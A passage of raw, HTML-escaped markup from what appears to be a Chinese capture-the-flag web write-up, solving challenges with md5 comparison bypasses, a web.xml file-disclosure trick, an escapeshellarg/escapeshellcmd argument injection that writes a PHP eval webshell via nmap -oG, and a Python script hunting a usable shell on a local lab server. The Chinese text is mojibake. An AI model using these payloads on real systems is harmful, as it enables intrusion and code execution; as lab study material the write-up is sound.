class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;;  &lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__tostring&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;  &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file))&amp;#123;  &lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; file_get_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file); &lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;U R SO CLOSE !///COME ON PLZ&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;  &lt;br&gt;    &amp;#125;  &lt;br&gt;&amp;#125;  &lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç›´æ¥æ„é€  payload å°±å¯ä»¥æ‹¿åˆ° flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;bjdctf2020easy-md5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bjdctf2020easy-md5&#34;&gt;#&lt;/a&gt; [BJDCTF2020]Easy MD5&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æŠ“åŒ…ï¼Œåœ¨ header éƒ¨åˆ†æ‹¿åˆ° hintï¼šâ€select * from â€˜adminâ€™ where password=md5 ($pass,true)â€œï¼Œä¹‹å‰é‡åˆ°è¿‡ï¼Œè¾“å…¥å¯†ç â€ffifdyopâ€œï¼Œè·³è½¬åˆ°  levels91.php&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&amp;lt;!--&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;$a = $GET[&amp;#x27;a&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;$b = $_GET[&amp;#x27;b&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    // wow, glzjin wants a girl friend.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;?a=s155964671a&amp;amp;b=s878926199a è·³è½¬åˆ° levell14.php&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt; &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;error_reporting(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;br&gt;highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;param1&amp;#x27;&lt;/span&gt;]!==&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;param2&amp;#x27;&lt;/span&gt;]&amp;amp;&amp;amp;md5(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;param1&amp;#x27;&lt;/span&gt;])===md5(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;param2&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$flag&lt;/span&gt;;&lt;br&gt;&amp;#125; &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¼ºç±»å‹æ¯”è¾ƒï¼Œä½†æ˜¯ php ä¸­ MD5ï¼ˆæ•°ç»„ï¼‰å°†ä¼šè¿”å› NULLï¼Œå› æ­¤ POST &lt;code&gt;param1[]=1&amp;amp;param2[]=2&lt;/code&gt;  å³å¯æ‹¿åˆ° flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;roarctf-2019easy-java&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#roarctf-2019easy-java&#34;&gt;#&lt;/a&gt; [RoarCTF 2019]Easy Java&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;WEB-INF/web.xml æ³„éœ²ï¼Œ&lt;a href=&#34;https://blog.csdn.net/wy_97/article/details/78165051&#34;&gt;https://blog.csdn.net/wy_97/article/details/78165051&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;ä¿®æ”¹è¯·æ±‚æ–¹æ³•ï¼Ÿfilename=WEB-INF/web.xml å¯ä»¥çœ‹åˆ°â€/Download                 FlagController        com.wm.ctf.FlagController                FlagController        /Flag â€œ&lt;/li&gt;
&lt;li&gt;filename=WEB-INF/classes/com/wm/ctf/FlagController.class å…¶ä¸­æœ‰ä¸€æ®µ base64 ç¼–ç ï¼Œè§£ç æ‹¿åˆ° flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;buuctf-2018online-tool&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#buuctf-2018online-tool&#34;&gt;#&lt;/a&gt; [BUUCTF 2018]Online Tool&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;REMOTE_ADDR&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;&lt;/span&gt;];&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;host&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;    highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;host&amp;#x27;&lt;/span&gt;];&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt; = escapeshellarg(&lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt; = escapeshellcmd(&lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$sandbox&lt;/span&gt; = md5(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;glzjin&amp;quot;&lt;/span&gt;. &lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;REMOTE_ADDR&amp;#x27;&lt;/span&gt;]);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;you are in sandbox &amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$sandbox&lt;/span&gt;;&lt;br&gt;    @mkdir(&lt;span class=&#34;hljs-variable&#34;&gt;$sandbox&lt;/span&gt;);&lt;br&gt;    chdir(&lt;span class=&#34;hljs-variable&#34;&gt;$sandbox&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;nmap -T5 -sT -Pn --host-timeout 2 -F &amp;quot;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;è€ƒç‚¹åº”è¯¥æ˜¯ bypass  escapeshellarg å’Œ escapeshellcmd ä»¥åŠå‚æ•°æ³¨å…¥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;nmap çš„å‚æ•°æ³¨å…¥çš„è¯æœ‰ä¸€ä¸ª &lt;code&gt;-oG&lt;/code&gt;  æˆ–è€… &lt;code&gt;-oN&lt;/code&gt;  æˆ–è€… &lt;code&gt;-o&lt;/code&gt;  éƒ½å¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•ç»•è¿‡ä¸¤ä¸ªå‡½æ•°äº†&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;[&lt;a href=&#34;https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5%20-%20escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/#%E7%BB%93%E8%AF%AD&#34;&gt;https://mochazz.github.io/2018/07/30 / ä»£ç å®¡è®¡ Day5 - escapeshellarg ä¸ escapeshellcmd ä½¿ç”¨ä¸å½“ /# ç»“è¯­&lt;/a&gt;](&lt;a href=&#34;https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5&#34;&gt;https://mochazz.github.io/2018/07/30 / ä»£ç å®¡è®¡ Day5&lt;/a&gt; - escapeshellarg ä¸ escapeshellcmd ä½¿ç”¨ä¸å½“ /# ç»“è¯­)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/164/&#34;&gt;https://paper.seebug.org/164/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;çœ‹åˆ°äº†è¿™ä¸¤ä¸ªå‡½æ•°å…¬ç”¨å¯¼è‡´çš„å¼•å·é€ƒé€¸&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ¥ä¸‹æ¥å°±æ˜¯è°ƒè¯• payload äº†ï¼Œå¼•å·è¿™ä¸ªä¸œè¥¿æœ‰ç‚¹éš¾è°ƒè¯•&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æœ€å payload &lt;code&gt;?host=&#39; &amp;lt;?php @eval($_POST[&amp;quot;flag&amp;quot;]);?&amp;gt; -oG flag.php &#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;å¼ºç½‘æ¯-2019é«˜æ˜çš„é»‘å®¢&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å¼ºç½‘æ¯-2019é«˜æ˜çš„é»‘å®¢&#34;&gt;#&lt;/a&gt; [å¼ºç½‘æ¯ 2019] é«˜æ˜çš„é»‘å®¢&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æºç ä¸­æœ‰å‡ åƒä¸ª shellï¼Œä½†æ˜¯åŸºæœ¬éƒ½æ˜¯ä¸èƒ½ç”¨çš„ï¼Œä¹Ÿå°±æ˜¯éœ€è¦æˆ‘ä»¬ç”¨è„šæœ¬æ‰¾å‡ºå¯ä»¥ç”¨çš„ shell&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åˆšå¼€å§‹å†™äº†ä¸ªåƒåœ¾å•çº¿ç¨‹è„šæœ¬ï¼Œè·‘åº”è¯¥æ˜¯è·‘çš„å‡ºæ¥çš„ï¼Œå°±æ˜¯å¯èƒ½è¦æŒºä¹…&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç„¶åå°è¯•å†™äº†ä¸ªå¤šçº¿ç¨‹çš„è„šæœ¬ï¼Œä½†æ˜¯ä¸€ä¸ªä¸€ä¸ªéå†å‚æ•°ï¼Œä¼°è®¡ä¹Ÿæ˜¯è¦å¥½ä¹…&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç½‘ä¸Šçœ‹åˆ°ä¸€ä¸ªæ¯”è¾ƒå¥½çš„è„šæœ¬ï¼Œä¸€ä¸ªæ–‡ä»¶åªè®¿é—®ä¸€æ¬¡ï¼ŒæŠŠæ‰€æœ‰å‚æ•°ä¸€æ¬¡éƒ½ä¼ è¿‡å»è¿™æ ·å°±å‡å°‘äº†å¤§éƒ¨åˆ†çš„è¯·æ±‚ï¼Œåœ¨ç¡®è®¤æŸä¸€ä¸ªæ–‡ä»¶å­˜åœ¨ shell ä¹‹åå†éå†æ‰€æœ‰å‚æ•°æ¥æ‰¾åˆ°å¯ç”¨å‚æ•°&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; os&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; re&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; threading&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; time&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;å¼€å§‹æ—¶é—´ï¼š  &amp;#x27;&lt;/span&gt;+  time.asctime( time.localtime(time.time()) ))&lt;br&gt;s1=threading.Semaphore(&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;)  							  			&lt;span class=&#34;hljs-comment&#34;&gt;#è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°&lt;/span&gt;&lt;br&gt;filePath = &lt;span class=&#34;hljs-string&#34;&gt;r&amp;quot;D:/phpstudy_pro/WWW/src&amp;quot;&lt;/span&gt;&lt;br&gt;os.chdir(filePath)													&lt;span class=&#34;hljs-comment&#34;&gt;#æ”¹å˜å½“å‰çš„è·¯å¾„&lt;/span&gt;&lt;br&gt;requests.adapters.DEFAULT_RETRIES = &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;								&lt;span class=&#34;hljs-comment&#34;&gt;#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥&lt;/span&gt;&lt;br&gt;files = os.listdir(filePath)&lt;br&gt;session = requests.Session()&lt;br&gt;session.keep_alive = &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;											 &lt;span class=&#34;hljs-comment&#34;&gt;# è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get_content&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;file&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    s1.acquire()												&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;trying   &amp;#x27;&lt;/span&gt;+file+ &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;     &amp;#x27;&lt;/span&gt;+ time.asctime( time.localtime(time.time()) ))&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;open&lt;/span&gt;(file,encoding=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; f:							&lt;span class=&#34;hljs-comment&#34;&gt;#æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°&lt;/span&gt;&lt;br&gt;            gets = &lt;span class=&#34;hljs-built_in&#34;&gt;list&lt;/span&gt;(re.findall(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\$_GET\[\&amp;#x27;(.*?)\&amp;#x27;\]&amp;#x27;&lt;/span&gt;, f.read()))&lt;br&gt;            posts = &lt;span class=&#34;hljs-built_in&#34;&gt;list&lt;/span&gt;(re.findall(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\$_POST\[\&amp;#x27;(.*?)\&amp;#x27;\]&amp;#x27;&lt;/span&gt;, f.read()))&lt;br&gt;    data = &amp;#123;&amp;#125;														&lt;span class=&#34;hljs-comment&#34;&gt;#æ‰€æœ‰çš„$_POST&lt;/span&gt;&lt;br&gt;    params = &amp;#123;&amp;#125;														&lt;span class=&#34;hljs-comment&#34;&gt;#æ‰€æœ‰çš„$_GET&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; m &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; gets:&lt;br&gt;        params[m] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; n &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; posts:&lt;br&gt;        data[n] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;&lt;br&gt;    url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;http://127.0.0.1/src/&amp;#x27;&lt;/span&gt;+file&lt;br&gt;    req = session.post(url, data=data, params=params)			&lt;span 